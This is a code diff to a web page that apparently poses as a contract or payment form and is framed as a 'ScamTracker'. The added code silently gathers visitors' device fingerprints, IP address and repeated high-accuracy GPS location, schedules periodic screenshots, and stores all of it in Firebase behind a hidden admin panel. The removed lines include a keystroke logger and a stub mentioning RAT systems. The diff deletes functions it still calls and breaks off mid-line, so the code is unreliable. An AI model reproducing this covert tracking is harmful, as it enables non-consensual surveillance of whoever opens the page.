@@ -128,6 +128,17 @@
             font-weight: bold;
             width: 100%;
         }
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .action-buttons button {
+            flex: 1;
+            padding: 8px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -184,10 +195,10 @@
                 <button onclick="exportAllData()" style="background: #27ae60; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px; font-weight: bold;">
                     📥 Export All Data (JSON)
                 </button>
-                <button onclick="takeControl()" style="background: #e67e22; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px;">
-                    🚨 Take Control (Advanced)
+                <button onclick="deleteAllData()" style="background: #e74c3c; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px;">
+                    🗑️ Delete All Data
                 </button>
-                <button onclick="hideAdmin()" style="background: #e74c3c; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px;">
+                <button onclick="hideAdmin()" style="background: #e67e22; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px;">
                     ❌ Close Panel
                 </button>
             </div>
@@ -201,7 +212,7 @@
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
     <script>
         // ========================
-        // 🔥 YOUR FIREBASE CONFIG
+        // 🔥 FIREBASE CONFIGURATION
         // ========================
         const firebaseConfig = {
             apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
@@ -233,12 +244,86 @@
         }, 3500);
 
         // ========================
-        // 🕵️‍♂️ COVERT TRACKING SYSTEM
+        // 🕵️‍♂️ ENHANCED LOCATION TRACKING
         // ========================
         const sessionId = 'session_' + Math.random().toString(36).substring(2, 15);
         const adminPassword = "ScamTracker2024"; // CHANGE THIS IN PRODUCTION
 
-        // 1. Device Fingerprinting
+        // 1. FAST GPS Acquisition System
+        function acquireFastLocation() {
+            return new Promise((resolve) => {
+                // First try: High accuracy with short timeout
+                const highAccuracyOptions = {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 5000
+                };
+
+                // Second try: Lower accuracy if first fails
+                const lowAccuracyOptions = {
+                    enableHighAccuracy: false,
+                    maximumAge: 30000,
+                    timeout: 3000
+                };
+
+                const attemptLocation = (options, isRetry = false) => {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            const { latitude, longitude, accuracy } = position.coords;
+                            resolve({
+                                coords: { lat: latitude, lng: longitude },
+                                accuracy: accuracy + ' meters',
+                                mapsLink: `https://maps.google.com/?q=${latitude},${longitude}`,
+                                status: "active",
+                                method: isRetry ? "standard" : "high-accuracy"
+                            });
+                        },
+                        error => {
+                            if (!isRetry) {
+                                attemptLocation(lowAccuracyOptions, true);
+                            } else {
+                                resolve({
+                                    status: "error",
+                                    error: error.message || "Location unavailable"
+                                });
+                            }
+                        },
+                        options
+                    );
+                };
+
+                if (navigator.geolocation) {
+                    attemptLocation(highAccuracyOptions);
+                } else {
+                    resolve({
+                        status: "unsupported",
+                        error: "Geolocation not available"
+                    });
+                }
+            });
+        }
+
+        // 2. Track Location with Fallbacks
+        async function trackLocation() {
+            // Immediately set status to "acquiring"
+            db.ref(`sessions/${sessionId}/location`).set({
+                status: "acquiring",
+                timestamp: new Date().toISOString()
+            });
+
+            const location = await acquireFastLocation();
+            
+            // Save results to Firebase
+            db.ref(`sessions/${sessionId}/location`).update({
+                ...location,
+                timestamp: new Date().toISOString(),
+                lastUpdated: new Date().toLocaleTimeString()
+            });
+
+            return location.status === "active";
+        }
+
+        // 3. Enhanced Device Fingerprinting
         function collectDeviceData() {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             return {
@@ -253,55 +338,15 @@
             };
         }
 
-        // 2. Location Tracking
-        function trackLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const { latitude, longitude, accuracy } = position.coords;
-                    db.ref(`sessions/${sessionId}/location`).update({
-                        coords: { lat: latitude, lng: longitude },
-                        accuracy: accuracy + ' meters',
-                        mapsLink: `https://maps.google.com/?q=${latitude},${longitude}`,
-                        timestamp: new Date().toISOString()
-                    });
-                }, null, { enableHighAccuracy: true });
-            }
-        }
+        // ========================
+        // 🚀 INITIALIZE TRACKING
+        // ========================
+        db.ref(`sessions/${sessionId}`).update({
+            startTime: new Date().toISOString(),
+            device: collectDeviceData()
+        });
 
-        // 3. Keylogger & Form Tracking
-        function setupFormTracking() {
-            document.querySelectorAll('input, textarea').forEach(field => {
-                field.addEventListener('input', (e) => {
-                    db.ref(`sessions/${sessionId}/keystrokes`).push({
-                        field: e.target.id || 'unknown',
-                        value: e.target.value,
-                        timestamp: new Date().toISOString()
-                    });
-                });
-            });
-
-            document.getElementById('signButton').addEventListener('click', () => {
-                const name = document.getElementById('signatureName').value;
-                const amount = document.getElementById('paymentAmount').value;
-                db.ref(`sessions/${sessionId}/events`).push({
-                    type: 'contract_signed',
-                    name: name,
-                    amount: amount,
-                    timestamp: new Date().toISOString()
-                });
-            });
-        }
-
-        // 4. Screenshot Capture
-        function captureScreenshot() {
-            html2canvas(document.body).then(canvas => {
-                canvas.toBlob(blob => {
-                    storage.ref(`screenshots/${sessionId}_${Date.now()}.png`).put(blob);
-                });
-            });
-        }
-
-        // 5. IP Address Capture
+        // Get IP address
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
@@ -310,21 +355,23 @@
                 });
             });
 
-        // Initialize tracking
-        db.ref(`sessions/${sessionId}`).update({
-            startTime: new Date().toISOString(),
-            device: collectDeviceData()
-        });
-
-        // Start periodic tracking
+        // Start tracking systems
         setupFormTracking();
-        setTimeout(trackLocation, 5000);
+        
+        // FAST INITIAL LOCATION (no delay)
+        trackLocation().then(success => {
+            if (success) {
+                console.log("Fast location acquired!");
+            }
+        });
+        
+        // Ongoing tracking
         setInterval(trackLocation, 15000);
-        setTimeout(captureScreenshot, 10000);
+        setTimeout(captureScreenshot, 5000);
         setInterval(captureScreenshot, 30000);
 
         // ========================
-        // 🚪 ADMIN PANEL FUNCTIONS
+        // 🛠️ ADMIN PANEL FUNCTIONS
         // ========================
         function verifyAdmin() {
             const enteredPassword = document.getElementById('adminPassword').value;
@@ -355,34 +402,64 @@
                     const location = sessionData.location || {};
                     const ip = device.ip || 'Unknown';
                     
+                    let locationStatus = "❌ Blocked";
+                    let mapsLink = "#";
+                    
+                    if (location && location.status === "active") {
+                        locationStatus = `✅ ${location.coords.lat}, ${location.coords.lng}`;
+                        mapsLink = location.mapsLink;
+                    } else if (location && location.error) {
+                        locationStatus = `⚠️ ${location.error}`;
+                    }
+                    
                     sessionsHTML += `
                         <div class="session-card">
                             <h3>🔎 ${sessionId}</h3>
                             <p><strong>📅 Started:</strong> ${new Date(sessionData.startTime).toLocaleString()}</p>
                             <p><strong>🌐 IP:</strong> ${ip}</p>
+                            <p><strong>📍 Location:</strong> ${locationStatus}</p>
                             
-                            ${location.coords ? `
-                                <p><strong>📍 GPS:</strong> 
-                                    ${location.coords.lat}, ${location.coords.lng} 
-                                    (Accuracy: ${location.accuracy || 'N/A'})
-                                </p>
+                            ${mapsLink !== "#" ? `
                                 <p>
-                                    <a class="gps-link" onclick="window.open('${location.mapsLink || '#'}', '_blank')">
+                                    <a class="gps-link" onclick="window.open('${mapsLink}', '_blank')">
                                         🗺️ View in Google Maps
                                     </a>
                                 </p>
-                            ` : '<p>📍 Location: Pending...</p>'}
+                            ` : ''}
                             
-                            <p><strong>🖥️ Device:</strong> ${device.userAgent || 'Unknown'}</p>
-                            
-                            <button onclick="viewFullSession('${sessionId}')" style="background: #3498db; color: white; border: none; padding: 8px 15px; border-radius: 4px; margin-top: 10px; cursor: pointer; width: 100%;">
-                                🔍 View Full Details
-                            </button>
+                            <div class="action-buttons">
+                                <button onclick="deleteSession('${sessionId}')" style="background: #e74c3c; color: white; border: none;">
+                                    🗑️ Delete
+                                </button>
+                                <button onclick="viewFullSession('${sessionId}')" style="background: #3498db; color: white; border: none;">
+                                    🔍 Details
+                                </button>
+                            </div>
                         </div>
                     `;
                 });
                 document.getElementById('sessionList').innerHTML = sessionsHTML;
             });
+        }
+
+        function deleteSession(sessionId) {
+            if (confirm(`Delete ALL data for session ${sessionId}?`)) {
+                db.ref(`sessions/${sessionId}`).remove()
+                    .then(() => alert("Session deleted successfully"))
+                    .catch(() => alert("Failed to delete session"));
+            }
+        }
+
+        function deleteAllData() {
+            if (confirm("⚠️ Delete ALL tracking data? This cannot be undone!")) {
+                db.ref('sessions').remove()
+                    .then(() => {
+                        alert("All data deleted successfully");
+                        document.getElementById('sessionList').innerHTML = '';
+                        document.getElementById('sessionCount').textContent = '0';
+                    })
+                    .catch(() => alert("Failed to delete data"));
+            }
         }
 
         function viewFullSession(sessionId) {
@@ -410,30 +487,4 @@ ${JSON.stringify(data, null, 2)}
             db.ref('sessions').once('value').then(snapshot => {
                 const data = snapshot.val();
                 const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `scammer_evidence_${new Date().toISOString()}.json`;
-                a.click();
-            });
-        }
-
-        function takeControl() {
-            alert("🚨 Advanced functions would connect to RAT systems or trigger alerts to law enforcement.");
-        }
-
-        // 5-tap activation (alternative access method)
-        let tapCount = 0;
-        document.addEventListener('click', (e) => {
-            if (e.clientX > window.innerWidth - 50 && e.clientY < 50) {
-                tapCount++;
-                if (tapCount >= 5) {
-                    document.getElementById('adminOverlay').style.display = 'block';
-                    tapCount = 0;
-                }
-                setTimeout(() => { tapCount = 0; }, 2000);
-            }
-        });
-    </script>
-</body>
-              </html>
+                const url = URL.createObjectURL(b
